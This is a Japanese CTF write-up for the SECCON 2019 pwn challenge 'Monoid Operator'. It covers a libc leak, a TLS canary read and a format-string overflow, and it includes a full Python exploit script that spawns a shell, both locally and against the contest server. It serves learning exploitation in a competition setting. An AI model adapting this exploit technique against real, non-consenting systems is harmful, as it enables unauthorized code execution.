# [pwn 444pts] Monoid Operator - SECCON CTF 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f monoid_operator_9092cbe0e255da46164bf38851880c1878ad3cbd
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               4       monoid_operator_9092cbe0e255da46164bf38851880c1878ad3cbd
```
なんか+とか*とかを任意個の要素に適用できます。このときmallocで確保され、scanfで読み込まれます。scanfの戻り値をチェックしていないので実質UAF的なことができ、libc leakは簡単です。
まぁそこはどうでも良くて、終了前にsprintfでFSBができます。しかし"n"が使えないのでBOFする必要があります。といってもcanaryがあるのでこれを何とかしないとダメなのですが、stackのポインタを持っていないので難しいです。TLSにもcanaryがあるのですが、libcからの相対アドレスはある程度固定なのでこれを使いましょう。

gdbで確認するとlibc base + 0x5ed528にありました。
```
pwndbg> search -p 0x4d726b19f4664f00
warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd2d07, halting search.
                0x7ffff7fd1528 0x4d726b19f4664f00
[stack]         0x7fffffffca08 0x4d726b19f4664f00
[stack]         0x7fffffffd148 0x4d726b19f4664f00
[stack]         0x7fffffffd1a8 0x4d726b19f4664f00
[stack]         0x7fffffffdad8 0x4d726b19f4664f00
pwndbg> p/x 0x7ffff7fd1528 - 0x7ffff79e4000
$1 = 0x5ed528
```

```python
from ptrlib import *

def add(array):
    sock.sendlineafter("?\n", "+")
    sock.sendlineafter("?\n", str(len(array)))
    sock.recvline()
    for data in array:
        if data is None:
            sock.sendline("+")
        else:
            sock.sendline(str(data))
    sock.recvuntil("is ")
    return int(sock.recvline()[:-1])

def mul(array):
    sock.sendlineafter("?\n", "*")
    sock.sendlineafter("?\n", str(len(array)))
    sock.recvline()
    for data in array:
        if data is None:
            sock.sendline("+")
        else:
            sock.sendline(str(data))
    r = sock.recvuntil("is ")
    if b'Overflow' in r:
        return 0
    return int(sock.recvline()[:-1])

#"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./monoid_operator_9092cbe0e255da46164bf38851880c1878ad3cbd")
libc_main_arena = 0x3ebc40
one_gadget = 0x10a38c
"""
libc = ELF("./libc.so.6_9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b")
sock = Socket("monoidoperator.chal.seccon.jp", 27182)
libc_main_arena = 0x1e4c40
one_gadget = 0x106ef8
#"""

# libc base
mul([9 for i in range(0x500 // 8)])
libc_base = add([None] + [0 for i in range(0x500 // 8 - 1)]) - libc_main_arena - 96
addr_canary = libc_base + 0x5ed528
logger.info("libc base = " + hex(libc_base))

# fsb
payload  = '%{}c'.format(0x408)
payload += '%11$c'
payload += '%13$s'
payload += bytes2str(p64(libc_base + one_gadget))
sock.sendlineafter("?\n", "q")
sock.sendafter("?\n", p64(addr_canary + 1)[:-1])
sock.sendlineafter("!\n", payload)

sock.interactive()
```

わおわお。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=25941)
[+] <module>: libc base = 0x7ffff79e4000
[ptrlib]$ What is your name?
Hi, )ý÷ÿ.
Please write your feed back!
id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
面白かったです。
